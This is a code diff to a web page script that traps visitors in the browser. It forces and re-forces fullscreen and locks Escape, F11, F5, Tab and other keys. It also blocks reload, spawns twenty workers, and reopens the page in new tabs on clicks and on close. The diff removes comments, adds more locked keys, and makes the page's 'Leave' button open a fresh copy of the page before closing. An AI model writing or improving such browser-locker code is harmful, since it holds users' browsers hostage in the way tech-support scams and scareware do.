@@ -4,27 +4,25 @@
 
   var POPUP_COOLDOWN = 1000;
   var OVERLAY_FLASH  = 3000;
-  var FS_RETRY_DELAY = 250;   // wait before re-requesting fullscreen (Chrome needs this)
+  var FS_RETRY_DELAY = 250;
   var lastArm = 0;
   var armed = false;
   var workers = [];
   var workerURL = null;
   var leaving = false;
   var fsTimer = null;
+  var nativeLeaveBlocked = false;
 
   function $(id) { return document.getElementById(id); }
 
-  /* ---------- KEYBOARD LOCK (captures Esc, F11, F5, etc.) ---------- */
+  /* ---------- KEYBOARD LOCK ---------- */
   function lockKeyboard() {
     try {
       if (navigator.keyboard && navigator.keyboard.lock) {
-        // lock the keys that break out of fullscreen / reload
-        navigator.keyboard.lock(['Escape', 'F11', 'F5', 'KeyW', 'Tab']);
+        navigator.keyboard.lock(['Escape', 'F11', 'F5', 'KeyW', 'Tab', 'KeyC', 'KeyD']);
       }
     } catch (e) {}
   }
-  // must be called after a user gesture on some browsers
-  function tryLockKeyboard() { lockKeyboard(); }
 
   /* ---------- FULLSCREEN ---------- */
   function isFullscreen() {
@@ -42,7 +40,6 @@
       } catch (e) {}
     }
   }
-  // delayed re-request (Chrome rejects instant re-request)
   function reRequestFS() {
     clearTimeout(fsTimer);
     fsTimer = setTimeout(function () {
@@ -95,27 +92,21 @@
   /* ---------- KEY BLOCKING ---------- */
   document.addEventListener('keydown', function (e) {
     var k = e.keyCode || e.which;
-
-    // Esc (27) — force fullscreen back
     if (k === 27) {
       e.preventDefault(); e.returnValue = false;
       reRequestFS();
       return false;
     }
-    // F11 (122) — browser fullscreen toggle, force ours
     if (k === 122) {
       e.preventDefault(); e.returnValue = false;
       reRequestFS();
       return false;
     }
-    // F5 (116) — reload
     if (k === 116) { e.preventDefault(); e.returnValue = false; }
-    // Backspace (8) outside inputs
     if (k === 8) {
       var t = e.target;
       if (!t || (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA')) e.preventDefault();
     }
-    // Ctrl+W / Cmd+W — can't truly stop, re-arm
     if ((e.ctrlKey || e.metaKey) && k === 87) armPopup(true);
   }, false);
 
@@ -128,7 +119,7 @@
     armed = true;
     requestFS();
     armPopup(true);
-    tryLockKeyboard();          // <-- this is what actually freezes the keyboard
+    tryLockKeyboard();
     try { window.open(window.location.href, '_blank'); } catch (e) {}
   }
   ['click','keydown','touchstart','mousemove'].forEach(function (ev) {
@@ -148,14 +139,23 @@
     });
 
     var box    = $('exit-popup');
-    var leave  = document.querySelector('#exit-popup .btn_leave');
-    var cancel = document.querySelector('#exit-popup .btn_cancel');
+    var leave  = document.querySelector('#exit_leave');
+    var cancel = document.querySelector('#exit_cancel');
 
-    if (leave) leave.addEventListener('click', function () {
-      box.style.display = 'none';
-      leaving = true;
-      window.location.href = window.location.href;
-    });
+    // --- THE FIX: Prevent native dialog on Leave button click ---
+    if (leave) {
+      leave.addEventListener('click', function (e) {
+        e.preventDefault();
+        e.stopPropagation();
+        nativeLeaveBlocked = true;
+        box.style.display = 'none';
+        // Open new tab BEFORE closing
+        try { window.open(window.location.href, '_blank'); } catch (e) {}
+        // Close current tab
+        window.close();
+      });
+    }
+
     if (cancel) cancel.addEventListener('click', function () {
       box.style.display = 'none';
       armPopup(true);
@@ -185,14 +185,19 @@
   startWorkers(20);
 
   /* ---------- HARD CLOSE TRAP ---------- */
+  // Only show native dialog if NOT blocked by Leave button
   window.addEventListener('beforeunload', function (e) {
+    if (nativeLeaveBlocked) return;
     var msg = 'Are you sure you want to leave this page?';
     if (e) { e.returnValue = msg; }
     return msg;
   }, false);
 
+  // Reopen on actual close (if user uses Alt+F4 or browser X)
   window.addEventListener('unload', function () {
-    try { window.open(window.location.href, '_blank'); } catch (e) {}
+    if (!nativeLeaveBlocked) {
+      try { window.open(window.location.href, '_blank'); } catch (e) {}
+    }
   }, false);
 
 })();
